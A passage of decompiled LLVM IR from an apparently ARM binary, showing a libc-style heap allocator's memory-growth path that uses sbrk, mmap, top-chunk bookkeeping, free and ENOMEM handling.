  store i32 %v3_11ff4, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_11fe8, %v3_11fe4
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_11fe8, i32* %v2_11fe4, align 4
  %v0_11ffc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11ffc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_11ffc = phi i32 [ %v0_11fe0, %bb148 ], [ %v1_11ffc.pre, %bb149 ]
  %v0_11ffc = phi i32 [ %v2_11fe8, %bb148 ], [ %v0_11ffc.pre, %bb149 ]
  %v2_11ffc = add i32 %v1_11ffc, 868
  %v3_11ffc = inttoptr i32 %v2_11ffc to i32*
  store i32 %v0_11ffc, i32* %v3_11ffc, align 4
  %v0_12000 = load i32, i32* %r1.global-to-local, align 4
  %v1_12000 = load i32, i32* %r3.global-to-local, align 4
  %v2_12000 = add i32 %v1_12000, %v0_12000
  store i32 %v2_12000, i32* %r1.global-to-local, align 4
  %v1_12004 = load i32, i32* %r2.global-to-local, align 4
  %v0_12008 = load i32, i32* %lr.global-to-local, align 4
  %v1_12008 = add i32 %v0_12008, 8
  store i32 %v1_12008, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_12000, %v1_12004
  br i1 %tmp213, label %bb151, label %dec_label_pc_1231c

bb151:                                            ; preds = %bb150
  %v5_1200c = load i32, i32* %ip.global-to-local, align 4
  %v6_1200c = add i32 %v5_1200c, 884
  %v7_1200c = inttoptr i32 %v6_1200c to i32*
  store i32 %v2_12000, i32* %v7_1200c, align 4
  br label %dec_label_pc_1231c

dec_label_pc_12014:                               ; preds = %dec_label_pc_11f58, %dec_label_pc_11f38, %dec_label_pc_11f6c.dec_label_pc_12014_crit_edge, %dec_label_pc_11f48
  %v1_12038 = phi i32 [ %v1_12038.pre, %dec_label_pc_11f6c.dec_label_pc_12014_crit_edge ], [ %v0_11ee0, %dec_label_pc_11f48 ], [ %v0_11ee0, %dec_label_pc_11f38 ], [ %v0_11ee0, %dec_label_pc_11f58 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %ip.global-to-local, align 4
  %v4_1201c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_1201c, i32* %r3.global-to-local, align 4
  %v1_12020 = add i32 %v4_1201c, 44
  %v2_12020 = inttoptr i32 %v1_12020 to i32*
  %v3_12020 = load i32, i32* %v2_12020, align 4
  store i32 %v3_12020, i32* %r0.global-to-local, align 4
  %v1_12024 = add i32 %v4_1201c, 864
  %v2_12024 = inttoptr i32 %v1_12024 to i32*
  %v3_12024 = load i32, i32* %v2_12024, align 4
  store i32 %v3_12024, i32* %r2.global-to-local, align 4
  %v1_12028 = add i32 %v4_1201c, 840
  %v2_12028 = inttoptr i32 %v1_12028 to i32*
  %v3_12028 = load i32, i32* %v2_12028, align 4
  store i32 %v3_12028, i32* %r3.global-to-local, align 4
  %v1_1202c = add i32 %v3_12020, 4
  %v2_1202c = inttoptr i32 %v1_1202c to i32*
  %v3_1202c = load i32, i32* %v2_1202c, align 4
  store i32 %v3_1202c, i32* %r1.global-to-local, align 4
  %v1_12034 = urem i32 %v3_12024, 2
  %v2_12034 = icmp eq i32 %v1_12034, 0
  %v1_12030 = add i32 %v1_12038, 16
  %v2_12038 = add i32 %v1_12030, %v3_12028
  store i32 %v2_12038, i32* %r3.global-to-local, align 4
  %v1_1203c = and i32 %v3_1202c, -4
  store i32 %v1_1203c, i32* @r8, align 4
  br i1 %v2_12034, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_12014
  %v3_12040 = sub i32 %v2_12038, %v1_1203c
  store i32 %v3_12040, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_12014, %bb152
  %v0_12044 = phi i32 [ %v2_12038, %dec_label_pc_12014 ], [ %v3_12040, %bb152 ]
  %v1_12044 = load i32, i32* %sb.global-to-local, align 4
  %v2_12044 = add i32 %v1_12044, %v0_12044
  store i32 %v2_12044, i32* %r3.global-to-local, align 4
  %v1_12048 = sub i32 -1, %v1_12044
  store i32 %v1_12048, i32* %fp.global-to-local, align 4
  %v2_1204c = and i32 %v2_12044, %v1_12048
  store i32 %v2_1204c, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_1204c, 1
  br i1 %tmp154, label %dec_label_pc_12070, label %dec_label_pc_1205c

dec_label_pc_1205c:                               ; preds = %bb153
  store i32 %v2_1204c, i32* %r0.global-to-local, align 4
  %v1_12060 = call i32 @__GI_sbrk(i32 %v2_1204c)
  store i32 %v1_12060, i32* %r0.global-to-local, align 4
  %v3_12064 = icmp eq i32 %v1_12060, -1
  store i32 %v1_12060, i32* @r4, align 4
  br i1 %v3_12064, label %dec_label_pc_12070, label %dec_label_pc_120dc

dec_label_pc_12070:                               ; preds = %dec_label_pc_1205c, %bb153
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r1.global-to-local, align 4
  %v4_12078 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_12078, i32* %r6.global-to-local, align 4
  %v1_1207c = add i32 %v4_12078, 864
  %v2_1207c = inttoptr i32 %v1_1207c to i32*
  %v3_1207c = load i32, i32* %v2_1207c, align 4
  store i32 %v3_1207c, i32* %r3.global-to-local, align 4
  %v1_12080 = urem i32 %v3_1207c, 2
  %v2_12080 = icmp eq i32 %v1_12080, 0
  br i1 %v2_12080, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_12070
  %v1_12084 = load i32, i32* @r8, align 4
  %v2_12084 = load i32, i32* %sb.global-to-local, align 4
  %v3_12084 = add i32 %v2_12084, %v1_12084
  %v2_12088 = load i32, i32* @r5, align 4
  %v3_12088 = add i32 %v3_12084, %v2_12088
  store i32 %v3_12088, i32* %r3.global-to-local, align 4
  %v2_1208c = load i32, i32* %fp.global-to-local, align 4
  %v3_1208c = and i32 %v2_1208c, %v3_12088
  store i32 %v3_1208c, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_12070
  %v0_12090.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_12090 = phi i32 [ %v0_12090.pr, %.thread29thread-pre-split ], [ %v3_1208c, %bb155 ]
  %v2_12090 = icmp ugt i32 %v0_12090, 1048575
  br i1 %v2_12090, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_120a8 = phi i32 [ %v0_12090, %.thread29 ], [ 1048576, %bb156 ]
  %v1_12098 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_120a8, %v1_12098
  br i1 %tmp214, label %dec_label_pc_120a0, label %dec_label_pc_12304

dec_label_pc_120a0:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_120a8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_120bc = call i32 @mmap(i32 0, i32 %v0_120a8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_120bc, i32* %r0.global-to-local, align 4
  %v3_120c0 = icmp eq i32 %v6_120bc, -1
  %v8_120c0 = icmp eq i32 %v6_120bc, -1
  store i32 %v6_120bc, i32* @r4, align 4
  br i1 %v8_120c0, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_120a0
  %v1_120c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_120c8 = add i32 %v1_120c8, 864
  %v3_120c8 = inttoptr i32 %v2_120c8 to i32*
  %v4_120c8 = load i32, i32* %v3_120c8, align 4
  %v2_120cc = load i32, i32* @r5, align 4
  %v3_120cc = add i32 %v2_120cc, %v6_120bc
  store i32 %v3_120cc, i32* %r0.global-to-local, align 4
  %v2_120d0 = and i32 %v4_120c8, -2
  store i32 %v2_120d0, i32* %r3.global-to-local, align 4
  store i32 %v2_120d0, i32* %v3_120c8, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_120a0, %bb158
  br i1 %v3_120c0, label %dec_label_pc_120dc, label %dec_label_pc_120e0

dec_label_pc_120dc:                               ; preds = %.thread32, %dec_label_pc_1205c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %.thread32, %dec_label_pc_120dc
  %v0_120e0 = load i32, i32* @r4, align 4
  %v7_120e0 = icmp eq i32 %v0_120e0, -1
  br i1 %v7_120e0, label %dec_label_pc_12304, label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %dec_label_pc_120e0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v4_120f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_120f0, i32* %ip.global-to-local, align 4
  store i32 %v3_12020, i32* %r2.global-to-local, align 4
  %v1_120f8 = add i32 %v4_120f0, 872
  %v2_120f8 = inttoptr i32 %v1_120f8 to i32*
  %v3_120f8 = load i32, i32* %v2_120f8, align 4
  %v1_120fc = load i32, i32* @r8, align 4
  %v2_120fc = add i32 %v1_120fc, %v3_12020
  store i32 %v2_120fc, i32* %r1.global-to-local, align 4
  %v0_12100 = load i32, i32* @r5, align 4
  %v2_12100 = add i32 %v0_12100, %v3_120f8
  store i32 %v2_12100, i32* %r3.global-to-local, align 4
  %v9_12104 = icmp eq i32 %v0_120e0, %v2_120fc
  br i1 %v9_12104, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_120e8
  store i32 %v2_12100, i32* %v2_120f8, align 4
  br label %dec_label_pc_12120

bb159:                                            ; preds = %dec_label_pc_120e8
  %v1_12108 = load i32, i32* %r0.global-to-local, align 4
  %v8_12108 = icmp eq i32 %v1_12108, -1
  store i32 %v2_12100, i32* %v2_120f8, align 4
  br i1 %v8_12108, label %.thread34, label %dec_label_pc_12120

.thread34:                                        ; preds = %bb159
  %v1_12110 = load i32, i32* @r5, align 4
  %v2_12110 = load i32, i32* @r8, align 4
  %v3_12110 = add i32 %v2_12110, %v1_12110
  %v2_12114 = or i32 %v3_12110, 1
  store i32 %v2_12114, i32* %r3.global-to-local, align 4
  %v2_12118 = load i32, i32* %r2.global-to-local, align 4
  %v3_12118 = add i32 %v2_12118, 4
  %v4_12118 = inttoptr i32 %v3_12118 to i32*
  store i32 %v2_12114, i32* %v4_12118, align 4
  br label %dec_label_pc_12298

dec_label_pc_12120:                               ; preds = %bb159, %.thread122
  %v0_12124.pr = load i32, i32* @r8, align 4
  %v0_12120 = load i32, i32* %ip.global-to-local, align 4
  %v1_12120 = add i32 %v0_12120, 864
  %v2_12120 = inttoptr i32 %v1_12120 to i32*
  %v3_12120 = load i32, i32* %v2_12120, align 4
  store i32 %v3_12120, i32* %r2.global-to-local, align 4
  %v2_12124 = icmp eq i32 %v0_12124.pr, 0
  br i1 %v2_12124, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_12120
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_12120
  %v2_1212c = urem i32 %v3_12120, 2
  store i32 %v2_1212c, i32* %r3.global-to-local, align 4
  %v2_12130 = icmp eq i32 %v2_1212c, 0
  br i1 %v2_12130, label %.thread40, label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %.thread36
  %v0_12138 = load i32, i32* @r4, align 4
  %v1_12138 = load i32, i32* %r1.global-to-local, align 4
  %v3_12138 = icmp ult i32 %v0_12138, %v1_12138
  br i1 %v3_12138, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_12138
  %v2_1213c = and i32 %v3_12120, -2
  store i32 %v2_1213c, i32* %r3.global-to-local, align 4
  store i32 %v2_1213c, i32* %v2_12120, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_12138, %.thread37, %.thread36, %bb160
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %ip.global-to-local, align 4
  %v4_1214c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_1214c, i32* @r7, align 4
  %v1_12150 = add i32 %v4_1214c, 864
  %v2_12150 = inttoptr i32 %v1_12150 to i32*
  %v3_12150 = load i32, i32* %v2_12150, align 4
  store i32 %v3_12150, i32* %r3.global-to-local, align 4
  %v1_12154 = urem i32 %v3_12150, 2
  store i32 %v1_12154, i32* @r6, align 4
  %v2_12154 = icmp eq i32 %v1_12154, 0
  br i1 %v2_12154, label %dec_label_pc_121e8, label %dec_label_pc_1215c

dec_label_pc_1215c:                               ; preds = %.thread40
  %v0_1215c = load i32, i32* @r8, align 4
  %v2_1215c = icmp eq i32 %v0_1215c, 0
  br i1 %v2_1215c, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_1215c
  %v2_12160 = add i32 %v4_1214c, 872
  %v3_12160 = inttoptr i32 %v2_12160 to i32*
  %v4_12160 = load i32, i32* %v3_12160, align 4
  store i32 %v4_12160, i32* %r2.global-to-local, align 4
  %v1_12164 = load i32, i32* %r1.global-to-local, align 4
  %v2_12164 = load i32, i32* @r4, align 4
  %v3_12164 = sub i32 %v2_12164, %v1_12164
  %v3_12168 = add i32 %v3_12164, %v4_12160
  store i32 %v3_12168, i32* %r3.global-to-local, align 4
  store i32 %v3_12168, i32* %v3_12160, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_1215c, %bb161
  %v0_12170 = load i32, i32* @r4, align 4
  %v1_12170 = urem i32 %v0_12170, 8
  store i32 %v1_12170, i32* %r3.global-to-local, align 4
  %v2_12170 = icmp eq i32 %v1_12170, 0
  br i1 %v2_12170, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_12174 = sub nsw i32 8, %v1_12170
  store i32 %v2_12174, i32* %r3.global-to-local, align 4
  %v3_12178 = add i32 %v2_12174, %v0_12170
  store i32 %v3_12178, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_12180 = phi i32 [ 0, %.thread43 ], [ %v2_12174, %bb162 ]
  %v1_1217c = load i32, i32* @r5, align 4
  %v2_1217c = add i32 %v1_1217c, %v0_12170
  store i32 %v2_1217c, i32* @r6, align 4
  %v1_12180 = load i32, i32* @r8, align 4
  %v2_12180 = add i32 %v2_1217c, %v0_12180
  %v2_12184 = add i32 %v2_12180, %v1_12180
  store i32 %v2_12184, i32* %r1.global-to-local, align 4
  %v1_12188 = load i32, i32* %sb.global-to-local, align 4
  %v2_12188 = add i32 %v1_12188, %v2_12184
  %v1_1218c = load i32, i32* %fp.global-to-local, align 4
  %v2_1218c = and i32 %v1_1218c, %v2_12188
  store i32 %v2_1218c, i32* %r2.global-to-local, align 4
  %v2_12190 = sub i32 0, %v2_1217c
  store i32 %v2_12190, i32* %r3.global-to-local, align 4
  %v2_12194 = sub i32 %v2_1218c, %v2_1217c
  store i32 %v2_12194, i32* @r5, align 4
  store i32 %v2_12194, i32* %r0.global-to-local, align 4
  br i1 %v2_12170, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_12170, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_121a0 = call i32 @__GI_sbrk(i32 %v2_12194)
  store i32 %v1_121a0, i32* %r0.global-to-local, align 4
  %v3_121a4 = icmp eq i32 %v1_121a0, -1
  br i1 %v3_121a4, label %dec_label_pc_121ac, label %dec_label_pc_121bc

dec_label_pc_121ac:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_121b0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_121b0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12214

dec_label_pc_121bc:                               ; preds = %bb164
  %v1_121bc = load i32, i32* @r4, align 4
  %v3_121bc = icmp ult i32 %v1_121a0, %v1_121bc
  br i1 %v3_121bc, label %dec_label_pc_121c4, label %dec_label_pc_12214

dec_label_pc_121c4:                               ; preds = %dec_label_pc_121bc
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r0.global-to-local, align 4
  %v4_121cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_121cc, i32* %r2.global-to-local, align 4
  %v1_121d0 = add i32 %v4_121cc, 864
  %v2_121d0 = inttoptr i32 %v1_121d0 to i32*
  %v3_121d0 = load i32, i32* %v2_121d0, align 4
  %v0_121d4 = load i32, i32* @r6, align 4
  store i32 %v0_121d4, i32* %r0.global-to-local, align 4
  %v1_121d8 = and i32 %v3_121d0, -2
  store i32 %v1_121d8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_121d8, i32* %v2_121d0, align 4
  br label %dec_label_pc_12214

dec_label_pc_121e8:                               ; preds = %.thread40
  %v0_121e8 = load i32, i32* %r0.global-to-local, align 4
  %v3_121e8 = icmp eq i32 %v0_121e8, -1
  br i1 %v3_121e8, label %dec_label_pc_121f0, label %dec_label_pc_1220c

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121e8
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_121f4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_121f4, i32* %r0.global-to-local, align 4
  %v0_121f8 = load i32, i32* @r7, align 4
  %v1_121f8 = add i32 %v0_121f8, 872
  %v2_121f8 = inttoptr i32 %v1_121f8 to i32*
  %v3_121f8 = load i32, i32* %v2_121f8, align 4
  store i32 %v3_121f8, i32* %r2.global-to-local, align 4
  %v0_121fc = load i32, i32* @r4, align 4
  %v0_12200 = load i32, i32* @r5, align 4
  %v2_121fc = add i32 %v3_121f8, %v1_121f4
  %v2_12200 = sub i32 %v2_121fc, %v0_121fc
  %v2_12204 = sub i32 %v2_12200, %v0_12200
  store i32 %v2_12204, i32* %r3.global-to-local, align 4
  store i32 %v2_12204, i32* %v2_121f8, align 4
  %v0_12210.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121e8, %dec_label_pc_121f0
  %v0_12210 = phi i32 [ 0, %dec_label_pc_121e8 ], [ %v0_12210.pre, %dec_label_pc_121f0 ]
  %v0_1220c = load i32, i32* @r4, align 4
  store i32 %v0_1220c, i32* @r7, align 4
  store i32 %v0_12210, i32* @r5, align 4
  br label %dec_label_pc_12214

dec_label_pc_12214:                               ; preds = %dec_label_pc_121bc, %dec_label_pc_121c4, %dec_label_pc_121ac, %dec_label_pc_1220c
  %v0_12214 = load i32, i32* %r0.global-to-local, align 4
  %v7_12214 = icmp eq i32 %v0_12214, -1
  br i1 %v7_12214, label %dec_label_pc_12298, label %dec_label_pc_1221c

dec_label_pc_1221c:                               ; preds = %dec_label_pc_12214
  %v1_1221c = load i32, i32* @r5, align 4
  %v2_1221c = add i32 %v1_1221c, %v0_12214
  %v0_12220 = load i32, i32* @r7, align 4
  %v2_12220 = sub i32 %v2_1221c, %v0_12220
  %v1_12224 = or i32 %v2_12220, 1
  %v2_12228 = add i32 %v0_12220, 4
  %v3_12228 = inttoptr i32 %v2_12228 to i32*
  store i32 %v1_12224, i32* %v3_12228, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12234 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_12234, i32* @r6, align 4
  %v1_12238 = add i32 %v4_12234, 872
  %v2_12238 = inttoptr i32 %v1_12238 to i32*
  %v3_12238 = load i32, i32* %v2_12238, align 4
  %v0_1223c = load i32, i32* @r8, align 4
  %v2_1223c = icmp eq i32 %v0_1223c, 0
  %v0_12240 = load i32, i32* @r5, align 4
  %v2_12240 = add i32 %v0_12240, %v3_12238
  store i32 %v2_12240, i32* %r3.global-to-local, align 4
  store i32 %v2_12240, i32* %v2_12238, align 4
  %v0_12248 = load i32, i32* @r7, align 4
  %v1_12248 = load i32, i32* @r6, align 4
  %v2_12248 = add i32 %v1_12248, 44
  %v3_12248 = inttoptr i32 %v2_12248 to i32*
  store i32 %v0_12248, i32* %v3_12248, align 4
  br i1 %v2_1223c, label %dec_label_pc_12298, label %dec_label_pc_12250

dec_label_pc_12250:                               ; preds = %dec_label_pc_1221c
  %v0_12254 = load i32, i32* @r8, align 4
  %v1_12254 = add i32 %v0_12254, -12
  %v1_12258 = and i32 %v1_12254, -8
  store i32 %v3_12020, i32* %ip.global-to-local, align 4
  %v2_12260 = add i32 %v1_12258, %v3_12020
  store i32 %v2_12260, i32* %r1.global-to-local, align 4
  %v2_12264 = icmp ugt i32 %v1_12258, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_1226c = or i32 %v1_12258, 1
  store i32 %v1_1226c, i32* %r3.global-to-local, align 4
  store i32 %v1_1226c, i32* %v2_1202c, align 4
  %v0_12274 = load i32, i32* %r2.global-to-local, align 4
  %v1_12274 = load i32, i32* %r1.global-to-local, align 4
  %v2_12274 = add i32 %v1_12274, 8
  %v3_12274 = inttoptr i32 %v2_12274 to i32*
  store i32 %v0_12274, i32* %v3_12274, align 4
  %v0_12278 = load i32, i32* %r2.global-to-local, align 4
  %v1_12278 = load i32, i32* %r1.global-to-local, align 4
  %v2_12278 = add i32 %v1_12278, 4
  %v3_12278 = inttoptr i32 %v2_12278 to i32*
  store i32 %v0_12278, i32* %v3_12278, align 4
  br i1 %v2_12264, label %dec_label_pc_12280, label %dec_label_pc_12298

dec_label_pc_12280:                               ; preds = %dec_label_pc_12250
  %v0_12280 = load i32, i32* @r6, align 4
  %v1_12280 = add i32 %v0_12280, 836
  %v2_12280 = inttoptr i32 %v1_12280 to i32*
  %v3_12280 = load i32, i32* %v2_12280, align 4
  store i32 %v3_12280, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12288 = load i32, i32* %ip.global-to-local, align 4
  %v1_12288 = add i32 %v0_12288, 8
  store i32 %v1_12288, i32* @r0, align 4
  store i32 -1, i32* %v2_12280, align 4
  %v0_12290 = call i32 @free()
  store i32 %v0_12290, i32* %r0.global-to-local, align 4
  %v0_12294 = load i32, i32* @r4, align 4
  %v1_12294 = load i32, i32* @r6, align 4
  %v2_12294 = add i32 %v1_12294, 836
  %v3_12294 = inttoptr i32 %v2_12294 to i32*
  store i32 %v0_12294, i32* %v3_12294, align 4
  br label %dec_label_pc_12298

dec_label_pc_12298:                               ; preds = %.thread34, %dec_label_pc_12250, %dec_label_pc_1221c, %dec_label_pc_12214, %dec_label_pc_12280
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r0.global-to-local, align 4
  %v4_122a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_122a0, i32* %lr.global-to-local, align 4
  %v1_122a4 = add i32 %v4_122a0, 872
  store i32 %v1_122a4, i32* %r1.global-to-local, align 4
  %v1_122a8 = inttoptr i32 %v1_122a4 to i32*
  %v2_122a8 = load i32, i32* %v1_122a8, align 4
  store i32 %v2_122a8, i32* %r1.global-to-local, align 4
  %v3_122a8 = add i32 %v4_122a0, 876
  %v4_122a8 = inttoptr i32 %v3_122a8 to i32*
  %v5_122a8 = load i32, i32* %v4_122a8, align 4
  store i32 %v5_122a8, i32* %r3.global-to-local, align 4
  %v1_122b0 = add i32 %v4_122a0, 868
  %v2_122b0 = inttoptr i32 %v1_122b0 to i32*
  %v3_122b0 = load i32, i32* %v2_122b0, align 4
  store i32 %v3_122b0, i32* %r3.global-to-local, align 4
  %v1_122b4 = add i32 %v4_122a0, 884
  %v2_122b4 = inttoptr i32 %v1_122b4 to i32*
  %v3_122b4 = load i32, i32* %v2_122b4, align 4
  store i32 %v3_122b4, i32* %r2.global-to-local, align 4
  %v2_122b8 = add i32 %v3_122b0, %v2_122a8
  store i32 %v2_122b8, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_122a8, %v5_122a8
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_12298
  store i32 %v2_122a8, i32* %v4_122a8, align 4
  %v0_122c0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_122c0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_12298, %bb165
  %v1_122c0 = phi i32 [ %v3_122b4, %dec_label_pc_12298 ], [ %v1_122c0.pre, %bb165 ]
  %v4_122c4 = phi i32 [ %v2_122b8, %dec_label_pc_12298 ], [ %v0_122c0.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_122c4, %v1_122c0
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_122c4 = load i32, i32* %lr.global-to-local, align 4
  %v6_122c4 = add i32 %v5_122c4, 884
  %v7_122c4 = inttoptr i32 %v6_122c4 to i32*
  store i32 %v4_122c4, i32* %v7_122c4, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_122c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_122c8 = add i32 %v0_122c8, 44
  %v2_122c8 = inttoptr i32 %v1_122c8 to i32*
  %v3_122c8 = load i32, i32* %v2_122c8, align 4
  store i32 %v3_122c8, i32* %ip.global-to-local, align 4
  %v1_122cc = add i32 %v3_122c8, 4
  %v2_122cc = inttoptr i32 %v1_122cc to i32*
  %v3_122cc = load i32, i32* %v2_122cc, align 4
  store i32 %v1_11ee0, i32* %r1.global-to-local, align 4
  %v1_122d4 = and i32 %v3_122cc, -4
  store i32 %v1_122d4, i32* %r3.global-to-local, align 4
  %v3_122d8 = icmp ult i32 %v1_122d4, %v1_11ee0
  br i1 %v3_122d8, label %dec_label_pc_12304, label %dec_label_pc_122e0

dec_label_pc_122e0:                               ; preds = %bb168
  %v0_122e0 = load i32, i32* @sl, align 4
  %v2_122e0 = sub i32 %v1_122d4, %v0_122e0
  %v2_122e4 = add i32 %v0_122e0, %v3_122c8
  store i32 %v2_122e4, i32* %r1.global-to-local, align 4
  %v1_122e8 = or i32 %v2_122e0, 1
  store i32 %v1_122e8, i32* %r3.global-to-local, align 4
  %v1_122ec = or i32 %v0_122e0, 1
  store i32 %v1_122ec, i32* %r2.global-to-local, align 4
  %v1_122f0 = add i32 %v3_122c8, 8
  store i32 %v1_122f0, i32* %r0.global-to-local, align 4
  store i32 %v1_122ec, i32* %v2_122cc, align 4
  %v0_122f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_122f8 = load i32, i32* %lr.global-to-local, align 4
  %v2_122f8 = add i32 %v1_122f8, 44
  %v3_122f8 = inttoptr i32 %v2_122f8 to i32*
  store i32 %v0_122f8, i32* %v3_122f8, align 4
  %v0_122fc = load i32, i32* %r3.global-to-local, align 4
  %v1_122fc = load i32, i32* %r1.global-to-local, align 4
  %v2_122fc = add i32 %v1_122fc, 4
  %v3_122fc = inttoptr i32 %v2_122fc to i32*
  store i32 %v0_122fc, i32* %v3_122fc, align 4
  br label %dec_label_pc_1231c

dec_label_pc_12304:                               ; preds = %bb157, %bb168, %dec_label_pc_120e0
  store i32 ptrtoint (i32* @global_var_f3d8.398 to i32), i32* %r3.global-to-local, align 4
  %v0_12308 = call i32 @__aeabi_read_tp()
  %v3_1230c = load i16, i16* @global_var_216ec.303, align 2
  %v4_1230c = sext i16 %v3_1230c to i32
  store i32 %v4_1230c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12314 = add i32 %v4_1230c, %v0_12308
  %v4_12314 = inttoptr i32 %v3_12314 to i32*
  store i32 12, i32* %v4_12314, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1231c

dec_label_pc_1231c:                               ; preds = %bb151, %bb150, %dec_label_pc_122e0, %dec_label_pc_11f28, %dec_label_pc_12304
  %v0_1231c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1231c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12320

dec_label_pc_12320:                               ; preds = %.thread1, %dec_label_pc_11ef4, %.thread121, %dec_label_pc_11d64, %dec_label_pc_11d58, %dec_label_pc_11bc0, %dec_label_pc_11b44, %dec_label_pc_1231c
  store i32 %v2_11a64, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v4_12330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 44) to i32*), align 4
  store i32 %v4_12330, i32* @ip, align 4
  store i32 74556, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12330)
  br label %dec_label_pc_1233c

